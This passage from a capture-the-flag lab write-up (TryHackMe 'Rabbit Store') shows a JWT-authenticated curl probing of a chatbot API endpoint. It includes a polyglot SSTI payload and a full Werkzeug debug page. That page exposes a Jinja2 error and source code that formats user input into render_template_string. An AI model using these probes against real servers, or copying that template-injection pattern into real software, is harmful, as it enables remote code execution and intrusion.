@@ -353,4 +353,417 @@ So there is still one api endpoint we didn't find out. Which is /api/fetch_messe
 {"message":"Token not provided"}%                                                                       
 ```
 
-Of course it wants token use browser.
+Firtlt grep the token from browser:
+
+
+```json
+jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g
+```
+
+Lets firstly post empty data to the /api/fetch_messeges_from_chatbot endpoint
+
+```bash
+❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{"":""}' 
+```
+
+And we get 
+```json
+{
+  "error": "username parameter is required"
+}
+```
+
+Lets use the body'ies we used before for test.
+
+
+```bash
+❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{ 
+    "username": "b"
+}'
+```
+```html
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+   <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       <title>Greeting</title>
+ </head>
+ <body>
+   <h1>Sorry, b@b.com, our chatbot server is currently under development.</h1>
+ </body>
+</html>%                                                          
+```
+
+
+```bash
+❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{ 
+    "username": "b"
+}'
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+   <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       <title>Greeting</title>
+ </head>
+ <body>
+   <h1>Sorry, b, our chatbot server is currently under development.</h1>
+ </body>
+</html>%                                                                                                
+```
+
+```bash
+❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{ 
+    "username": "admin"
+}'
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+   <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       <title>Greeting</title>
+ </head>
+ <body>
+   <h1>Sorry, admin, our chatbot server is currently under development.</h1>
+ </body>
+</html>%                                                                                                
+```
+
+Lets fuzz this using `ffuf`
+
+
+At some point I thought about using polygot SSTI payload such as `${{<%[%'"}}%\.`
+
+Lets try that
+
+```bash
+❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{  
+    {"username":"${{<%[%'\"}}%\\."}
+}' 
+```
+
+Also my shell sucked by regex so i need to use other tool.
+
+So i'll use `yaak`
+
+
+![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo8.webp){: width="972" height="589" }
+
+```html
+<!doctype html>
+<html lang=en>
+  <head>
+    <title>jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
+ // Werkzeug Debugger</title>
+    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
+    <link rel="shortcut icon"
+        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
+    <script>
+      var CONSOLE_MODE = false,
+          EVALEX = true,
+          EVALEX_TRUSTED = false,
+          SECRET = "3N5KsqGECxMzhx9H1W24";
+    </script>
+  </head>
+  <body style="background-color: #fff">
+    <div class="debugger">
+<h1>TemplateSyntaxError</h1>
+<div class="detail">
+  <p class="errormsg">jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
+</p>
+</div>
+<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
+<div class="traceback">
+  <h3></h3>
+  <ul><li><div class="frame" id="frame-139714297136624">
+  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
+      line <em class="line">1498</em>,
+      in <code class="function">__call__</code></h4>
+  <div class="source "><pre class="line before"><span class="ws">    </span>) -&gt; cabc.Iterable[bytes]:</pre>
+<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
+<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
+<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
+<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
+<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139714152878416">
+  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
+      line <em class="line">1476</em>,
+      in <code class="function">wsgi_app</code></h4>
+  <div class="source "><pre class="line before"><span class="ws">            </span>try:</pre>
+<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
+<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
+<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
+<pre class="line before"><span class="ws">                </span>error = e</pre>
+<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)</pre>
+<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
+<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
+<pre class="line after"><span class="ws">                </span>raise</pre>
+<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
+<pre class="line after"><span class="ws">        </span>finally:</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139714152878528">
+  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
+      line <em class="line">1473</em>,
+      in <code class="function">wsgi_app</code></h4>
+  <div class="source "><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
+<pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
+<pre class="line before"><span class="ws">        </span>try:</pre>
+<pre class="line before"><span class="ws">            </span>try:</pre>
+<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
+<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
+<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
+<pre class="line after"><span class="ws">                </span>error = e</pre>
+<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
+<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
+<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139714152878640">
+  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
+      line <em class="line">882</em>,
+      in <code class="function">full_dispatch_request</code></h4>
+  <div class="source "><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
+<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
+<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
+<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
+<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
+<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
+<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
+<pre class="line after"><span class="ws">        </span>self,</pre>
+<pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139714152878752">
+  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
+      line <em class="line">880</em>,
+      in <code class="function">full_dispatch_request</code></h4>
+  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
+<pre class="line before"><span class="ws">        </span>try:</pre>
+<pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
+<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
+<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
+<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()</pre>
+<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
+<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
+<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139714152878864">
+  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
+      line <em class="line">865</em>,
+      in <code class="function">dispatch_request</code></h4>
+  <div class="source "><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
+<pre class="line before"><span class="ws">        </span>):</pre>
+<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
+<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
+<pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
+<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
+<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
+<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
+<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139714152878976">
+  <h4>File <cite class="filename">"/home/azrael/chatbotServer/chatbot.py"</cite>,
+      line <em class="line">24</em>,
+      in <code class="function">index</code></h4>
+  <div class="source "><pre class="line before"><span class="ws"> </span>&lt;body&gt;</pre>
+<pre class="line before"><span class="ws">   </span>&lt;h1&gt;Sorry, {}, our chatbot server is currently under development.&lt;/h1&gt;</pre>
+<pre class="line before"><span class="ws"> </span>&lt;/body&gt;</pre>
+<pre class="line before"><span class="ws"></span>&lt;/html&gt;&#39;&#39;&#39;.format(username)</pre>
+<pre class="line before"><span class="ws"></span> </pre>
+<pre class="line current"><span class="ws">    </span>return render_template_string(template)</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws"></span>if __name__ == &#39;__main__&#39;:</pre>
+<pre class="line after"><span class="ws">    </span>app.run(debug=True, port=8000)</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139714152879088">
+  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py"</cite>,
+      line <em class="line">161</em>,
+      in <code class="function">render_template_string</code></h4>
+  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
+<pre class="line before"><span class="ws">    </span>:param source: The source code of the template to render.</pre>
+<pre class="line before"><span class="ws">    </span>:param context: The variables to make available in the template.</pre>
+<pre class="line before"><span class="ws">    </span>&#34;&#34;&#34;</pre>
+<pre class="line before"><span class="ws">    </span>app = current_app._get_current_object()  # type: ignore[attr-defined]</pre>
+<pre class="line current"><span class="ws">    </span>template = app.jinja_env.from_string(source)</pre>
+<pre class="line after"><span class="ws">    </span>return _render(app, template, context)</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws"></span>def _stream(</pre>
+<pre class="line after"><span class="ws">    </span>app: Flask, template: Template, context: dict[str, t.Any]</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139714152881888">
+  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite>,
+      line <em class="line">1108</em>,
+      in <code class="function">from_string</code></h4>
+  <div class="source "><pre class="line before"><span class="ws">        </span>:param template_class: Return an instance of this</pre>
+<pre class="line before"><span class="ws">            </span>:class:`Template` class.</pre>
+<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
+<pre class="line before"><span class="ws">        </span>gs = self.make_globals(globals)</pre>
+<pre class="line before"><span class="ws">        </span>cls = template_class or self.template_class</pre>
+<pre class="line current"><span class="ws">        </span>return cls.from_code(self, self.compile(source), gs, None)</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws">    </span>def make_globals(</pre>
+<pre class="line after"><span class="ws">        </span>self, d: t.Optional[t.MutableMapping[str, t.Any]]</pre>
+<pre class="line after"><span class="ws">    </span>) -&gt; t.MutableMapping[str, t.Any]:</pre>
+<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Make the globals map for a template. Any given template</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139714153021616">
+  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite>,
+      line <em class="line">768</em>,
+      in <code class="function">compile</code></h4>
+  <div class="source "><pre class="line before"><span class="ws">                </span>return source</pre>
+<pre class="line before"><span class="ws">            </span>if filename is None:</pre>
+<pre class="line before"><span class="ws">                </span>filename = &#34;&lt;template&gt;&#34;</pre>
+<pre class="line before"><span class="ws">            </span>return self._compile(source, filename)</pre>
+<pre class="line before"><span class="ws">        </span>except TemplateSyntaxError:</pre>
+<pre class="line current"><span class="ws">            </span>self.handle_exception(source=source_hint)</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws">    </span>def compile_expression(</pre>
+<pre class="line after"><span class="ws">        </span>self, source: str, undefined_to_none: bool = True</pre>
+<pre class="line after"><span class="ws">    </span>) -&gt; &#34;TemplateExpression&#34;:</pre>
+<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;A handy helper method that returns a callable that accepts keyword</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139714153021728">
+  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite>,
+      line <em class="line">939</em>,
+      in <code class="function">handle_exception</code></h4>
+  <div class="source "><pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;Exception handling helper.  This is used internally to either raise</pre>
+<pre class="line before"><span class="ws">        </span>rewritten exceptions or return a rendered traceback for the template.</pre>
+<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
+<pre class="line before"><span class="ws">        </span>from .debug import rewrite_traceback_stack</pre>
+<pre class="line before"><span class="ws"></span> </pre>
+<pre class="line current"><span class="ws">        </span>raise rewrite_traceback_stack(source=source)</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws">    </span>def join_path(self, template: str, parent: str) -&gt; str:</pre>
+<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Join a template with the parent.  By default all the lookups are</pre>
+<pre class="line after"><span class="ws">        </span>relative to the loader root so this method returns the `template`</pre>
+<pre class="line after"><span class="ws">        </span>parameter unchanged, but if the paths should be relative to the</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139714153021840">
+  <h4>File <cite class="filename">"&lt;unknown&gt;"</cite>,
+      line <em class="line">9</em>,
+      in <code class="function">template</code></h4>
+  <div class="source "></div>
+</div>
+</ul>
+  <blockquote>jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
+</blockquote>
+</div>
+
+<div class="plain">
+    <p>
+      This is the Copy/Paste friendly version of the traceback.
+    </p>
+    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
+  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File &#34;/home/azrael/chatbotServer/chatbot.py&#34;, line 24, in index
+    return render_template_string(template)
+  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py&#34;, line 161, in render_template_string
+    template = app.jinja_env.from_string(source)
+  File &#34;/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py&#34;, line 1108, in from_string
+    return cls.from_code(self, self.compile(source), gs, None)
+  File &#34;/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py&#34;, line 768, in compile
+    self.handle_exception(source=source_hint)
+  File &#34;/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py&#34;, line 939, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File &#34;&lt;unknown&gt;&#34;, line 9, in template
+jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
+</textarea>
+</div>
+<div class="explanation">
+  The debugger caught an exception in your WSGI application.  You can now
+  look at the traceback which led to the error.  <span class="nojavascript">
+  If you enable JavaScript you can also use additional features such as code
+  execution (if the evalex feature is enabled), automatic pasting of the
+  exceptions and much more.</span>
+</div>
+      <div class="footer">
+        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
+        friendly Werkzeug powered traceback interpreter.
+      </div>
+    </div>
+
+    <div class="pin-prompt">
+      <div class="inner">
+        <h3>Console Locked</h3>
+        <p>
+          The console is locked and needs to be unlocked by entering the PIN.
+          You can find the PIN printed out on the standard output of your
+          shell that runs the server.
+        <form>
+          <p>PIN:
+            <input type=text name=pin size=14>
+            <input type=submit name=btn value="Confirm Pin">
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
+
+<!--
+
+Traceback (most recent call last):
+  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/azrael/chatbotServer/chatbot.py", line 24, in index
+    return render_template_string(template)
+  File "/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py", line 161, in render_template_string
+    template = app.jinja_env.from_string(source)
+  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 1108, in from_string
+    return cls.from_code(self, self.compile(source), gs, None)
+  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 768, in compile
+    self.handle_exception(source=source_hint)
+  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 939, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "<unknown>", line 9, in template
+jinja2.exceptions.TemplateSyntaxError: unexpected '<'
+
+
+-->
+```
+
+
+And jinja2 templating engine gave errors.
+
+
+
+
